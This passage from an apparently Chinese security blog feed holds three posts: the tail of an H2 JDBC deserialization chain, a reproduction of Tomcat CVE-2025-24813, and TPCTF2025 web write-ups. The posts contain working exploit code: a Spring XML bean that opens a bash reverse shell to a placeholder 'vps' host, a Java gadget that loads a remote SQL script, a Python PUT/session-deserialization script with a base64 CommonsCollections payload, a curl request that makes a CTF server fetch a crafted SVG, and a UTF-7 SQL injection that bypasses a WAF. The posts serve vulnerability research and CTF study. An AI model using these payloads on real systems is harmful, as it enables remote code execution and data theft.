&#125;<br></code></pre></td></tr></table></figure><p>就连起来了。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>sql文件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS CLASS_FOR_NAME <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;<br><span class="hljs-keyword">CREATE</span> ALIAS NEW_INSTANCE <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;<br><span class="hljs-keyword">CREATE</span> ALIAS UNESCAPE_VALUE <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;<br><br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@url_str</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;http://vps:port/h2_revenge_evil.xml&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@url_obj</span><span class="hljs-operator">=</span>UNESCAPE_VALUE(<span class="hljs-variable">@url_str</span>);<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@context_clazz</span><span class="hljs-operator">=</span>CLASS_FOR_NAME(<span class="hljs-string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@string_clazz</span><span class="hljs-operator">=</span>CLASS_FOR_NAME(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>);<br><br><span class="hljs-keyword">CALL</span> NEW_INSTANCE(<span class="hljs-variable">@context_clazz</span>, <span class="hljs-keyword">ARRAY</span>[<span class="hljs-variable">@string_clazz</span>], <span class="hljs-keyword">ARRAY</span>[<span class="hljs-variable">@url_obj</span>]);<br></code></pre></td></tr></table></figure><p>xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Exp.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br><br><br>        UnsafeUtil.patchModule(Exp.class);<br>        UnsafeUtil.patchModule(ReflectUtil.class);<br><br>        <span class="hljs-type">MyDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(<span class="hljs-string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://vps:port/h2_revenge_poc.sql&#x27;&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>, <span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(dataSource);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) ReflectUtil.getFieldValue(CompoundEdit.class, undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(pojoNode);<br><br>        ReflectUtil.setFieldValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br><br>        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(eventListenerList)));<br>        <span class="hljs-comment">//SerializeUtil.test(eventListenerList);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>记得加VM Options。</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331173419158.png" alt="image-20250331173419158"></p><p>当然，也有那种打十六进制写入so文件然后在sql文件中打<code>java.lang.System.load</code>的：<a href="https://blog.csdn.net/Err0r233/article/details/146484415">NCTF2024 Web方向题解-CSDN博客</a></p><p>这也是打H2 JDBC的一种常用方法。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>JDK高版本还是太安全了，安全到基本就只有出难题出JDBC题的份了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-24813 Tomcat_RCE复现</title>
    <link href="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个洞也是最近刚披露就火起来了，因为确实都是老生常谈的洞，触发条件都是以前的CVE。</p><p>当然我是为了逃避最近的paper组的压力，感觉那边的事永远都做不完emmmmm，搭完那边的攻击环境就马上润来复现一下这个玩意了。</p><p>嘻嘻。</p><h1 id="触发条件及利用范围"><a href="#触发条件及利用范围" class="headerlink" title="触发条件及利用范围"></a>触发条件及利用范围</h1><p>其实就是几个CVE的缝合：</p><ul><li>CVE-2017-12615 Tomcat PUT 文件上传</li><li>CVE-2020-9484：Tomcat Session 反序列化漏洞</li><li>CVE-2024-50379 ：Tomcat PUT 条件竞争文件上传</li></ul><p>tomcat的漏洞版本：</p><ul><li>9.0.0.M1 &lt;&#x3D; tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 11.0.2</li></ul><p>漏洞产生的原因是默认<code>servlet</code>在启用写入的情况下，攻击者可以在特定目录下写入任意文件名的文件。结合Tomcat的临时session会话文件存储功能，可以实现反序列化RCE，利用需要满足以下几个条件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>、启用DefaultServlet写入，支持PUT请求；<br><span class="hljs-number">2</span>、开启了Tomcat会话，并且使用了默认的会话存储位置；<br><span class="hljs-number">3</span>、类路径下需要存在一个反序列化利用链的库依赖库。<br></code></pre></td></tr></table></figure><p>这里复现用的是<strong>tomcat9.0.96</strong>。（因为不想配高版本了hhh，偷个懒拿本机上的直接用了）</p><h1 id="CVE复现"><a href="#CVE复现" class="headerlink" title="CVE复现"></a>CVE复现</h1><h2 id="漏洞利用前置配方"><a href="#漏洞利用前置配方" class="headerlink" title="漏洞利用前置配方"></a>漏洞利用前置配方</h2><p>按照复现的思路，我们先开这个session存储吧，在conf&#x2F;context.xml增加：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">Store</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p>这个东西开启的效果就是不带cookie访问tomcat，然后停止tomcat，【.1.txt】同目录会生成序列化保存的session文件。</p><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315173552019.png" alt="image-20250315173552019"></p><p>但他只会短暂存在个十几秒，然后就没了。</p><p>然后在conf&#x2F;web.xml文件的<code>DefaultServlet</code>部分插入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>readonly<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br></code></pre></td></tr></table></figure><p>由此启用它的PUT功能。</p><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315164931046.png" alt="image-20250315164931046"></p><p>接着就是反序列化漏洞依赖了，不弄复杂了，就CC链吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o http://gitlab.53site.com/shuzhan/oss/-/raw/master/lib/commons-collections-3.2.1.jar?ref_type=heads<br></code></pre></td></tr></table></figure><p>把这个包放到tomcat的<code>webapps\ROOT\WEB-INF\lib</code>下，没lib文件夹的创一个就行了：</p><p>然后直接startup，tomcat启动！！！！</p><h2 id="反序列化复现"><a href="#反序列化复现" class="headerlink" title="反序列化复现"></a>反序列化复现</h2><p>先测测PUT：</p><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315165635833.png" alt="image-20250315165635833"></p><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315165650728.png" alt="image-20250315165650728"></p><p>没问题。</p><p>对于<a href="https://github.com/masahiro331/CVE-2020-9484">masahiro331&#x2F;CVE-2020-9484</a>，我们可以知道，假定用户上传了一个<code>/tmp/xxx.session</code>文件，就可以通过Cookie来触发<code>xxx.session</code>的反序列化。</p><p>对于这里的漏洞，我们还需要在请求头加上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Range: bytes <span class="hljs-number">0</span>-payload长度/<span class="hljs-number">1200</span><br></code></pre></td></tr></table></figure><p>然后PUT上传SESSION，之后GET访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Cookie:JSESSIONID=.xxx<br></code></pre></td></tr></table></figure><p>就能在<code>FileStore.load()</code>触发反序列化。</p><p>为了方便传参，干脆写个python脚本来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://localhost:8082&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put</span>(<span class="hljs-params">url, data, headers, timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">True</span></span>):<br>    response = requests.put(url=url, data=data, headers=headers, timeout=timeout, verify=verify)<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">url, headers, timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">True</span></span>):<br>    response = requests.get(url=url, headers=headers, timeout=timeout, verify=verify)<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># CC6/calc</span><br>    origin_payload = <span class="hljs-string">b&#x27;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAEdGVzdHNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWVwdAAJZ2V0TWV0aG9kdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAcc3EAfgATdXEAfgAYAAAAAnEAfgAScHQABmludm9rZXVxAH4AHAAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cQB+ABgAAAABdAAIY2FsYy5leGV0AARleGVjdXEAfgAcAAAAAXEAfgAfc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AAN4eHh4&#x27;</span><br><br>    <span class="hljs-comment">#tomcat内存马</span><br>    <span class="hljs-comment"># origin_payload = b&#x27;xxx&#x27;</span><br>    payload = base64.b64decode(origin_payload)<br>    put_headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Range&#x27;</span>: <span class="hljs-string">f&#x27;bytes 0-<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(payload)+<span class="hljs-number">1</span>&#125;</span>/1000&#x27;</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload)+<span class="hljs-number">1</span>)<br>    put_response = put(url+<span class="hljs-string">&#x27;/eddie/session&#x27;</span>, payload, put_headers)<br>    <span class="hljs-keyword">if</span>(put_response.status_code == <span class="hljs-number">409</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PUT SUCCESSFUL!&quot;</span>)<br><br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br>    get_headers = &#123;<br>        <span class="hljs-string">&quot;JSESSIONID&quot;</span> : <span class="hljs-string">&quot;.eddie&quot;</span><br>    &#125;<br>    get_response = get(url, get_headers)<br><br>    <span class="hljs-keyword">if</span>(get_response):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ATTACK SUCCESSFUL!&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315173816484.png" alt="image-20250315173816484"></p><p>但是这个有点不稳定，一次不一定能通。</p><p>可能就是那个timeout的问题，多打几次应该就没啥问题了。</p><p>内存马我试了下，打的不理想，感觉触发有点问题，所以暂时就用这个出网打法顶一下吧。</p><p>跟链子可以看大B哥的，写的很详细：</p><p>[CVE-2025-24813 Tomcat Session 反序列化组合拳 - Boogiepop Doesn’t Laugh](<a href="https://boogipop.com/2025/03/13/CVE-2025-24813">https://boogipop.com/2025/03/13/CVE-2025-24813</a> Tomcat Session 反序列化组合拳&#x2F;)</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/z6BY_xC4YR4PYHT8LI0u_w">CVE-2025-24813——tomcat文件上传到反序列化</a></p><p><a href="https://forum.butian.net/article/674">奇安信攻防社区-全网首发！CVE-2025-24813 Tomcat 最新 RCE 分析复现</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CVE复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TPCTF2025-WEB-Learning</title>
    <link href="/2025/03/12/TPCTF2025-WEB-Learning/"/>
    <url>/2025/03/12/TPCTF2025-WEB-Learning/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我勒个XSS大赛。。</p><p>最喜欢的java没有出现在web中，反而在misc中吗，哈吉tpctf你这家伙。</p><h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>附件给的是thumbor的插件环境，hint说没有0day。</p><p>那应该就不是thumbor本身的问题，其实也有点关系，就是可以url访问图片，这个在官方security文档就能看到：<a href="https://thumbor.readthedocs.io/en/latest/security.html">Security — Thumbor 7.7.4 documentation</a></p><p>但这个题其实是依赖的漏洞emmmmm，一开始真以为是挖0day。。。</p><p>thumbor1的依赖组件有一个ImageMagick，是一个免费的开源软件套件，用于显示、转换和编辑光栅图像和向量图像文件。它支持200多种图像文件格式，并可执行各种图像处理操作。</p><p>这里的漏洞即为<code>CVE-2022-44268</code>，ImageMagick的任意文件读取漏洞。</p><p><a href="https://www.metabaseq.com/threat/imagemagick-zero-days/">https://www.metabaseq.com/threat/imagemagick-zero-days/</a><br><a href="https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file">https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file</a></p><p>我们可以让靶机访问挂在自己vps上精心构造好的png，远程解析就会把对应的文件附加在图片里，复现CVE就完了：</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171249419.png" alt="image-20250312171249419"></p><p>flag也一样的，低权限可读：</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171325491.png" alt="image-20250312171325491"></p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171335377.png" alt="image-20250312171335377"></p><h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>还是一样的组件漏洞，但是可以发现dockerfile里重装了最新的ImageMagick，所以需要找新的组件。</p><p>这里队里nama和赵哥找了很多，试了XXE等等，以及ghostscript 9.5的RCE，均失败。但是很奇怪的是版本用的gs确实是9.5，为什么打不通呢。。。</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/761c7091405f5f466125cac7e6605f27.png" alt="img"></p><p>最终锁定漏洞组件librsvg，<code>CVE-2023-38633</code>：librsvg 2.56.3 之前版本中 URL 解码器的目录遍历问题，可以被本地或远程攻击者用来泄露文件：</p><p><a href="https://blog.csdn.net/HMX404/article/details/137231580">https://blog.csdn.net/HMX404/article/details/137231580</a></p><p>同样的打法，可以获得漏洞解析后的包含flag的图片，直接访问就能看到了：</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171818815.png" alt="image-20250312171818815"></p><p>这里看不到完整的直接调宽高就行了。flag也是低权限可读：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o output.jpg -H <span class="hljs-string">&quot;Host: 1.95.57.127:3602&quot;</span> -H <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate&quot;</span> -H <span class="hljs-string">&quot;Upgrade-Insecure-Requests: 1&quot;</span> -H <span class="hljs-string">&quot;Priority: u=0, i&quot;</span> -H <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&quot;</span> -H <span class="hljs-string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span> -H <span class="hljs-string">&quot;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span> <span class="hljs-string">&quot;http://1.95.57.127:3602/thumbor/unsafe/smart/http%3A%2F%2Fvps%3A1234%2F1.svg&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171851877.png" alt="image-20250312171851877"></p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>赵哥太狠了，直接拿下一血。</p><p>论文题，按照它的方法打复现就行了：</p><p><a href="https://www.jianjunchen.com/p/wafmanis.sq24.pdf">Jianjun Chen | Associate Professor | Tsinghua University</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion Vulnerabilities <span class="hljs-keyword">in</span> Web Application Firewalls<br>2024 IEEE Symposium on Security and Privacy<br>Qi Wang, Jianjun Chen, Zheyu Jiang, Run Guo, Ximeng Liu, Chao Zhang, Haixin Duan<br></code></pre></td></tr></table></figure><p>其实也是队里去清华的eki佬的论文，tql😭</p><p>高手！！！！！</p><p>直接往&#x2F;flag发POST：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">+AHUAcwBlAHIAbgBhAG0AZQ-=+AGEAZABtAGkAbg-&amp;+AHAAYQBzAHMAdwBvAHIAZA-=+ACcALwAqACoALwB1AG4AaQBvAG4ALwAqACoALwBTAEUATABFAEMAVAAvACoAKgAvADEALAAyACwAUgBFAFAATABBAEMARQAoAFIARQBQAEwAQQBDAEUAKAAnACIALwAqACoALwB1AG4AaQBvAG4ALwAqACoALwBTAEUATABFAEMAVAAvACoAKgAvADEALAAyACwAUgBFAFAATABBAEMARQAoAFIARQBQAEwAQQBDAEUAKAAiAC4AIgAsAEMASABBAFIAKAAzADQAKQAsAEMASABBAFIAKAAzADkAKQApACwAQwBIAEEAUgAoADQANgApACwAIgAuACIAKQAvACoAKgAvAEEAUwAvACoAKgAvAGMAaAAzAG4AcwAxAHIALQAtACcALABDAEgAQQBSACgAMwA0ACkALABDAEgAQQBSACgAMwA5ACkAKQAsAEMASABBAFIAKAA0ADYAKQAsACcAIgAvACoAKgAvAHUAbgBpAG8AbgAvACoAKgAvAFMARQBMAEUAQwBUAC8AKgAqAC8AMQAsADIALABSAEUAUABMAEEAQwBFACgAUgBFAFAATABBAEMARQAoACIALgAiACwAQwBIAEEAUgAoADMANAApACwAQwBIAEEAUgAoADMAOQApACkALABDAEgAQQBSACgANAA2ACkALAAiAC4AIgApAC8AKgAqAC8AQQBTAC8AKgAqAC8AYwBoADMAbgBzADEAcgAtAC0AJwApAC8AKgAqAC8AQQBTAC8AKgAqAC8AYwBoADMAbgBzADEAcgAtAC0-<br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312173728078.png" alt="image-20250312173728078"></p><p>当然也有真去注的，用quine注入，其他队的wp可以康：</p><p><a 